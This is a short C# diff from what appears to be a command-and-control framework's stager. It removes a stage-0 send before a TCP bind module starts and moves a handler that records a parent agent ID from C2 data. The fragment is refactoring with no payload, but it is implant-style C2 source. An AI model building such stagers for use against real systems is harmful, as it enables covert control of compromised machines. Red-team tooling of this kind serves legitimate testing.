@@ -69,9 +69,6 @@ namespace Stager
             };
 
             CommModule = new TCPCommModule(BindAddress, BindPort);
-            
-            SendStage0();
-
             CommModule.Start();
 
             while (!Staged)
@@ -105,6 +102,11 @@ namespace Stager
             }
         }
 
+        static void HandleNewLink(C2Data C2Data)
+        {
+            ParentAgentID = Encoding.UTF8.GetString(C2Data.Data);
+        }
+
         static void SendStage0()
         {
             var c2Data = Utilities.SerialiseData(
@@ -121,11 +123,6 @@ namespace Stager
                     AgentID = AgentID,
                     Data = c2Data
                 });
-        }
-
-        static void HandleNewLink(C2Data C2Data)
-        {
-            ParentAgentID = Encoding.UTF8.GetString(C2Data.Data);
         }
 
         static void Stage0Response(C2Data C2Data)
